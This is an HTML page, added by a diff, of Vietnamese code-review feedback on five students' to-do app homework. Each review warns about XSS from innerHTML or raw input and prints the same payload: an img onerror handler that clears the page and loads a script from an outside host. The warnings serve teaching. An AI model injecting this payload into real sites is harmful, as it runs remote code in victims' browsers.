@@ -1,0 +1,103 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><link rel="shortcut icon" href="../../../assets/images/favicon.ico" type="image/x-icon" /><title>Fullstack_nodeJs_K1/Day24</title><link rel="stylesheet" href="../../../assets/css/style.css" /></head><body><h1>Dương review bài học viên lớp K1-Fullstack</h1>
+<h2><a href="https://anhquan2211.github.io/F8-OFFLINE/f8-offline-day24/index.html">Luu Anh Quan</a></h2>
+<ul>
+<li>
+<p>[x] [Bài 1]</p>
+<p>Bài làm rất tốt*</p>
+<p>Thiếu case sau khi submit thì focus lại vào input.</p>
+<p>Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.</p>
+<pre><code class="language-html">&lt;img
+  src=&quot;&quot;
+  onerror='b=document,a=b.body;a.innerHTML=&quot;&quot;;a.appendChild(c = b.createElement(&quot;script&quot;),c.type=&quot;module&quot;,c.innerHTML=`import {HTML} from &quot;https:\/\/unpkg.com/jsvjp&quot;;HTML(&quot;h1&quot;, &quot;error&quot;, &quot;HACKED!&quot;)`);a.appendChild(d=b.createElement(&quot;link&quot;),d.rel=&quot;stylesheet&quot;,d.href=&quot;https:\/\/unpkg.com/jsvjp/style.css&quot;);'
+/&gt;
+</code></pre>
+<p>Các file App.js, Footer.js, Header.js nên tách ra thành các phần của folder layout để tránh bị rối với các components khác.</p>
+</li>
+<li>
+<p>[x] Đánh giá chung bài tập về nhà: Bài tập làm rất tốt, có hướng làm theo cách quản lý state và cập nhật DOM của React+redux.</p>
+</li>
+</ul>
+<hr>
+<h2><a href="https://github.com/Trungdeptraii/22-08-2023-Le-Van_Trung-Day24.git">Trung Le</a></h2>
+<ul>
+<li>
+<p>[x] [Bài 1]</p>
+<p>Bài làm rất tốt*</p>
+<p>Thiếu case thêm task bằng cách nhấn <code>enter</code>.</p>
+<ul>
+<li>Có thể sử dụng thẻ form để có sự kiện mặc định đó.</li>
+</ul>
+<p>Đang sử dụng value trực tiếp từ input chưa qua xử lý để đưa vào HTML, việc làm này rất dễ gặp lỗi tấn công XSS</p>
+<pre><code class="language-html">&quot;/&gt;&lt;img
+  src=&quot;&quot;
+  onerror='b=document,a=b.body;a.innerHTML=&quot;&quot;;a.appendChild(c = b.createElement(&quot;script&quot;),c.type=&quot;module&quot;,c.innerHTML=`import {HTML} from &quot;https:\/\/unpkg.com/jsvjp&quot;;HTML(&quot;h1&quot;, &quot;error&quot;, &quot;HACKED!&quot;)`);a.appendChild(d=b.createElement(&quot;link&quot;),d.rel=&quot;stylesheet&quot;,d.href=&quot;https:\/\/unpkg.com/jsvjp/style.css&quot;);'
+/&gt;
+</code></pre>
+<p>Các element get nhiều, có thể sử dụng một cách khác ngắn gọn hơn để lấy phần tử:</p>
+<pre><code class="language-js">var $ = (tag) =&gt; document.querySelector(tag);
+var $$ = (tag) =&gt; document.querySelectorAll(tag);
+</code></pre>
+<p>Các style nên sử dụng class Css để dễ dàng trong việc xử lý style tốt hơn.</p>
+</li>
+<li>
+<p>[x] Đánh giá chung bài tập về nhà: Bài tập làm rất tốt, tuy nhiên cần tối ưu lại phần chọn element để bài làm đỡ rối hơn.</p>
+</li>
+</ul>
+<hr>
+<h2><a href="https://github.com/QuocAnh-bit/F8_fullstack_006/blob/main/buoi_24/js/ex01.js">Dương Quốc Anh</a></h2>
+<ul>
+<li>
+<p>[x] [Bài 1]</p>
+<p>Bài làm tốt*</p>
+<p>Có thể phát triển thêm sau khi submit <strong>bằng button</strong> thì focus lại vào input.</p>
+<p>Case sửa input đang bị lỗi khi có từ 2 task trở lên thì sẽ bị sai value cũ của input, sau khi sửa, input không còn ở đúng vị trí của nó. Mà sẽ xuống cuối cùng.</p>
+<p>Chưa check trường hợp sau khi sửa, input rỗng vẫn được lưu.</p>
+<p>Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.</p>
+<pre><code class="language-html">&lt;img
+  src=&quot;&quot;
+  onerror='b=document,a=b.body;a.innerHTML=&quot;&quot;;a.appendChild(c = b.createElement(&quot;script&quot;),c.type=&quot;module&quot;,c.innerHTML=`import {HTML} from &quot;https:\/\/unpkg.com/jsvjp&quot;;HTML(&quot;h1&quot;, &quot;error&quot;, &quot;HACKED!&quot;)`);a.appendChild(d=b.createElement(&quot;link&quot;),d.rel=&quot;stylesheet&quot;,d.href=&quot;https:\/\/unpkg.com/jsvjp/style.css&quot;);'
+/&gt;
+</code></pre>
+</li>
+<li>
+<p>[x] Đánh giá chung bài tập về nhà: Bài tập làm tốt, tuy nhiên còn một số case chưa hoàn thiện tốt.</p>
+</li>
+</ul>
+<hr>
+<h2><a href="https://hieuboss.github.io/F8-fullstack-k2/javascript/lesson9/ex1/ex1.html">Duy Hiếu Nguyễn</a></h2>
+<ul>
+<li>
+<p>[x] [Bài 1]</p>
+<p>Bài làm chưa tốt</p>
+<p>Thiếu 2 case quan trọng: Sửa, xóa task.</p>
+<p>Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.</p>
+<pre><code class="language-html">&lt;img
+  src=&quot;&quot;
+  onerror='b=document,a=b.body;a.innerHTML=&quot;&quot;;a.appendChild(c = b.createElement(&quot;script&quot;),c.type=&quot;module&quot;,c.innerHTML=`import {HTML} from &quot;https:\/\/unpkg.com/jsvjp&quot;;HTML(&quot;h1&quot;, &quot;error&quot;, &quot;HACKED!&quot;)`);a.appendChild(d=b.createElement(&quot;link&quot;),d.rel=&quot;stylesheet&quot;,d.href=&quot;https:\/\/unpkg.com/jsvjp/style.css&quot;);'
+/&gt;
+</code></pre>
+</li>
+<li>
+<p>[x] Đánh giá chung bài tập về nhà: Bài tập làm chưa tốt, thiếu các case quan trọng khiến bài làm chưa hoàn thiện.</p>
+</li>
+</ul>
+<hr>
+<h2><a href="https://github.com/pth2003/FullStack_Nodejs_K1/blob/main/BTVN/btvn_buoi_24/script.js">Phan Trung Hiếu</a></h2>
+<p><strong>Chưa có github page</strong></p>
+<ul>
+<li>
+<p>[x] [Bài 1]</p>
+<p>Bài làm chưa tốt</p>
+<p>Thiếu 1 case quan trọng: Sửa</p>
+<p>Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.</p>
+<pre><code class="language-html">&lt;img
+  src=&quot;&quot;
+  onerror='b=document,a=b.body;a.innerHTML=&quot;&quot;;a.appendChild(c = b.createElement(&quot;script&quot;),c.type=&quot;module&quot;,c.innerHTML=`import {HTML} from &quot;https:\/\/unpkg.com/jsvjp&quot;;HTML(&quot;h1&quot;, &quot;error&quot;, &quot;HACKED!&quot;)`);a.appendChild(d=b.createElement(&quot;link&quot;),d.rel=&quot;stylesheet&quot;,d.href=&quot;https:\/\/unpkg.com/jsvjp/style.css&quot;);'
+/&gt;
+</code></pre>
+</li>
+<li>
+<p>[x] Đánh giá chung bài tập về nhà: Bài tập làm chưa tốt, thiếu 1 case quan trọng khiến bài làm chưa hoàn thiện.</p>
+</li>
+</ul>
+<script src="../../../assets/js/pages.js" defer></script></body></html>
